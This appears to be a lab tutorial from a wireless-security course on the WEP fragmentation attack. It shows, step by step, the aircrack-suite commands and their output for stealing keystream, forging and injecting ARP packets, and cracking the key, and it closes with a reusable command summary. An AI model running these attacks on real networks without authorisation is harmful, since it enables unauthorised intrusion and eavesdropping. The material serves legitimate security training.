---
title: Fragmentation Attacks
description: Fragmentation Attacks
date: '2026-09-21'
tags: []
published: true
slug: fragmentation-attacks
category: wifi
folder: diving-into-wep-attacks
order: 20
---
# Fragmentation Attack

## What is it?

The ARP replay attack (previous guide) needs a valid ARP request to already be floating around on the network. But what if there isn't one? That's where the **Fragmentation Attack** comes in — a different way to reach the same goal (generating IVs), without needing an existing ARP request.

**The core idea:** Instead of capturing an existing ARP packet, we steal a small piece of the router's keystream (called the **PRGA**) from any packet, then use that stolen keystream to _forge our own_ packets from scratch.

---

## Why This Works (The Technical Bit)

Remember: WEP encryption is really just **plaintext XOR keystream = ciphertext**. That means if you know any two of these three things, you can calculate the third.

**Here's the trick:** Almost every WiFi packet starts with a predictable 8-byte header (called LLC/SNAP). Since we can guess those first 8 bytes of plaintext, and we can see the encrypted version (ciphertext) of those same bytes, we can calculate 8 bytes of the keystream (PRGA) instantly — no key needed.

**Fragmentation speeds this up further:** By sending a long, made-up broadcast packet and splitting it into small fragments, each fragment lets us extract more keystream bytes. Repeating this quickly builds up a full **1500 bytes of keystream** — more than enough to forge any packet we want, including a fake ARP request.

---

## Step 1: Enable Monitor Mode

```shellsession
iccys@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

Confirm it worked:

```shellsession
iccys@htb[/htb]$ iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

---

## Step 2: Start Capturing Traffic

```shellsession
iccys@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WEP

18:58:49  Created capture file "WEP-01.cap".

 CH  1 ][ Elapsed: 18 mins ][ 2024-08-05 19:16

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 A2:BD:32:EB:21:15  -47   0    10632      264    0   1   11   WEP  WEP         HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 A2:BD:32:EB:21:15  42:E9:11:39:88:AE  -29    2 - 1      0      266
```

Leave this running in one terminal.

---

## Step 3: Run the Fragmentation Attack

In a second terminal:

```shellsession
iccys@htb[/htb]$ aireplay-ng -5 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 42:E9:11:39:88:AE
19:18:35  Waiting for beacon frame (BSSID: A2:BD:32:EB:21:15) on channel 1
19:18:35  Waiting for a data packet...
Read 66 packets...

        Size: 100, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  A2:BD:32:EB:21:15
          Dest. MAC  =  A2:BD:32:EB:21:15
         Source MAC  =  42:E9:11:39:88:AE

        0x0000:  0841 0201 d8d6 3deb 29d5 42e9 1139 88ae  .A....=.).B..9..
        0x0010:  d8d6 3deb 29d5 1026 4f54 f100 dca9 17cd  ..=.)..&OT......
        0x0020:  7d16 6690 e06e 2bbf 45e6 416b f0a0 5e22  }.f..n+.E.Ak..^"
        0x0030:  a8a7 dc23 ba6b 8e83 7523 21e3 4429 f6a2  ...#.k..u#!.D)..
        0x0040:  72f1 a051 a481 1cb7 c983 7653 9db4 cb71  r..Q......vS...q
        0x0050:  d4ca 075d 1117 59b8 aa8d 2779 582b 7f52  ...]..Y...'yX+R
        0x0060:  339e d3be                                3...

Use this packet ? y

Saving chosen packet in replay_src-0805-191842.cap
19:18:51  Data packet found!
19:18:51  Sending fragmented packet
19:18:51  Got RELAYED packet!!
19:18:51  Trying to get 384 bytes of a keystream
19:18:51  Got RELAYED packet!!
19:18:51  Trying to get 1500 bytes of a keystream
19:18:51  Got RELAYED packet!!
Saving keystream in fragment-0805-191851.xor
Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
```

**What each part means:**

|Part|Meaning|
|---|---|
|`-5`|Fragmentation attack mode|
|`-b A2:BD:32:EB:21:15`|Target router's MAC address|
|`-h 42:E9:11:39:88:AE`|Connected client's MAC address (or any address that can associate)|

🎉 **Success:** It found a data packet, fragmented it, and gradually built up a full **1500-byte keystream** — saved into `fragment-0805-191851.xor`.

---

## Step 4: Find the IP/MAC Details Needed for Forging

Use tcpdump to inspect the captured packet for real addresses:

```shellsession
iccys@htb[/htb]$ tcpdump -s 0 -n -e -r replay_src-0805-191842.cap

reading from file replay_src-0805-191842.cap, link-type IEEE802_11 (802.11), snapshot length 65535
13:20:06.328586 CF +QoS BSSID:a2:bd:32:eb:21:15 SA:42:e9:11:39:88:ae DA:a2:bd:32:eb:21:15 LLC, dsap SNAP
(0xaa) Individual, ssap SNAP (0xaa) Command, ctrl 0x03: oui Ethernet (0x000000), ethertype IPv4 (0x0800),
length 67: 192.168.1.129.63870 > 192.168.1.1.53: 34696+ A? outlook.office365.com. (39)
```

This reveals the IP addresses involved: `192.168.1.129` (the station) and `192.168.1.1` (likely the router/gateway).

⚠️ **Important — this step often won't show you IPs at all, and that's normal.** The captured packet is still fully WEP-encrypted at this point (you don't have the key yet — that's the whole point of this attack). `tcpdump` can only decode IP/DNS details if the packet reaching it has already been decrypted, which only happens when the capturing interface already has the WEP key configured. Since you don't have the key, `tcpdump` will usually just show you the raw 802.11 header fields instead, like this:

```
23:11:18.561261 BSSID:d8:d6:3d:eb:29:d5 SA:66:73:3d:2b:a1:51 DA:d8:d6:3d:eb:29:d5 Data IV:b26559 Pad 0 KeyID 0
```

No IP addresses, no DNS query — just the IV and header info. **This is expected**, not a mistake. If this happens to you, skip straight to Step 5 and use the broadcast IP trick described below instead of trying to extract real IPs.

---

## Step 5: Forge a Fake ARP Request

Now use packetforge-ng (from an earlier guide) with the stolen keystream to build our own fake ARP packet:

```shellsession
iccys@htb[/htb]$ packetforge-ng -0 -a A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE -k 192.168.1.1 -l 192.168.1.129 -y fragment-0805-191851.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap 
```

**What each part means:**

|Part|Meaning|
|---|---|
|`-0`|Build an ARP request|
|`-a`|Router's MAC address|
|`-h`|Client's MAC address|
|`-k`|Router's IP address|
|`-l`|Client's IP address|
|`-y`|The stolen keystream (PRGA) file|
|`-w`|Output filename for the forged packet|

📝 **Tip: no IP addresses from tcpdump? Use the broadcast address instead.** Most routers don't validate ARP IPs closely, so you can just use `255.255.255.255` for both `-k` and `-l` (covered in the packetforge-ng guide). This is the realistic path for most real attacks, since you usually won't have real IPs to work with at this stage:

```bash
packetforge-ng -0 -a D8:D6:3D:EB:29:D5 -h 66:73:3D:2B:A1:51 -k 255.255.255.255 -l 255.255.255.255 -y fragment-0921-231121.xor -w forgedarp.cap
```

Swap in your own BSSID, client MAC, and `.xor` keystream filename — then continue straight on to Step 6 (injecting the forged packet) exactly as normal.

---

## Step 6: Inject the Forged Packet to Generate IVs

```shellsession
iccys@htb[/htb]$ aireplay-ng -2 -r forgedarp.cap -h 42:E9:11:39:88:AE wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 42:E9:11:39:88:AE

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  A2:BD:32:EB:21:15
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  42:E9:11:39:88:AE

        0x0000:  0841 0201 d8d6 3deb 29d5 42e9 1139 88ae  .A....=.).B..9..
        0x0010:  ffff ffff ffff 8001 369f d800 5899 17e1  ........6...X...
        0x0020:  4841 7fed f893 7419 9d0f d368 9341 f130  HA...t....h.A.0
        0x0030:  c021 668c 9f07 a5ec 15be 3583 df2c b474  .!f.......5..,.t
        0x0040:  cf84 1ddb....

Use this packet ? y

Saving chosen packet in replay_src-0805-192042.cap
You should also start airodump-ng to capture replies.

Sent 1400 packets...(499 pps)
```

**What each part means:**

|Part|Meaning|
|---|---|
|`-2`|Interactive packet replay mode|
|`-r forgedarp.cap`|The forged packet file to inject|
|`-h`|Source MAC to use for injection|

Type `y` to confirm, and it starts blasting the fake ARP request at the router.

---

## Step 7: Watch the IVs Roll In

Back in your first terminal (airodump-ng), watch the **Frames** count climb rapidly:

```shellsession
 CH  1 ][ Elapsed: 2 mins ][ 2024-08-05 20:20 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 A2:BD:32:EB:21:15  -47   0     1584    23983  923   1   11   WEP  WEP         HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 A2:BD:32:EB:21:15  42:E9:11:39:88:AE  -48   11 - 1      0    36015 
```

That jump to **36,015 frames** confirms it's working — lots of fresh IVs being generated.

---

## Step 8 (Optional): Speed It Up Further

You can run an ARP replay attack (from the previous guide) at the same time, in a new terminal, to generate IVs even faster:

```shellsession
iccys@htb[/htb]$ sudo aireplay-ng -3 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 42:E9:11:39:88:AE
19:21:47  Waiting for beacon frame (BSSID: A2:BD:32:EB:21:15) on channel 1
Saving ARP requests in replay_arp-0805-192147.cap
You should also start airodump-ng to capture replies.
Read 133226 packets (got 30681 ARP requests and 0 ACKs), sent 27992 packets...(499 pps)
```

---

## Step 9: Crack the Key

Once you have enough IVs, run aircrack-ng as usual:

```shellsession
iccys@htb[/htb]$ aircrack-ng -b A2:BD:32:EB:21:15 WEP-01.cap

Got 85311 out of 85000 IVs
Starting PTW attack with 85311 ivs.   
                                              
                     KEY FOUND! [ 33:44:55:22:11 ]    
                     
Reading Decrypted correctly: 100%                                                                                                                        
Opening WEP-01.cap                                                                                                                                       
Read 306522 packets. 
```

🎉 **The WEP key is recovered:** `33:44:55:22:11`

---

## Fragmentation vs. ARP Replay: Quick Comparison

|                                | ARP Replay                      | Fragmentation                                   |
| ------------------------------ | ------------------------------- | ----------------------------------------------- |
| Needs an existing ARP request? | ✅ Yes                           | ❌ No                                            |
| Extra tools needed             | None                            | packetforge-ng, tcpdump                         |
| Complexity                     | Simple                          | More steps, but more flexible                   |
| When to use                    | When ARP traffic already exists | When the network is quiet / no ARP traffic seen |

---

## Command Summary

```bash
sudo airmon-ng start wlan0                                                    # Enable monitor mode
iwconfig                                                                      # Confirm monitor mode is active
airodump-ng wlan0mon -c 1 -w WEP                                              # Capture traffic (Terminal 1)
aireplay-ng -5 -b <BSSID> -h <client MAC> wlan0mon                           # Run the fragmentation attack, steal keystream
tcpdump -s 0 -n -e -r <captured .cap file>                                    # Inspect captured packet for IP/MAC info
packetforge-ng -0 -a <BSSID> -h <client MAC> -k <router IP> -l <client IP> -y <keystream.xor> -w forgedarp.cap   # Forge a fake ARP request
aireplay-ng -2 -r forgedarp.cap -h <client MAC> wlan0mon                     # Inject the forged packet to generate IVs
sudo aireplay-ng -3 -b <BSSID> -h <client MAC> wlan0mon                      # (Optional) Speed up with ARP replay too
aircrack-ng -b <BSSID> WEP-01.cap                                             # Crack the WEP key
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`-5`|Fragmentation attack mode (aireplay-ng)|
|`-b <BSSID>`|Target router's MAC address|
|`-h <MAC>`|Client MAC address to use/impersonate|
|`-r <file>`|The captured/forged packet file to replay|
|`-2`|Interactive packet replay mode (aireplay-ng)|
|`-3`|ARP request replay mode (aireplay-ng)|
|`-0`|Build an ARP request (packetforge-ng)|
|`-a`|Router's MAC address (packetforge-ng)|
|`-k`|Router's IP address (packetforge-ng)|
|`-l`|Client's IP address (packetforge-ng)|
|`-y`|The stolen keystream/PRGA file (packetforge-ng)|
|`-w`|Output filename|
|`-s 0`|Capture full packet length (tcpdump)|
|`-n`|Don't resolve hostnames (tcpdump)|
|`-e`|Show link-layer header info (tcpdump)|
|`-r`|Read from a capture file (tcpdump)|

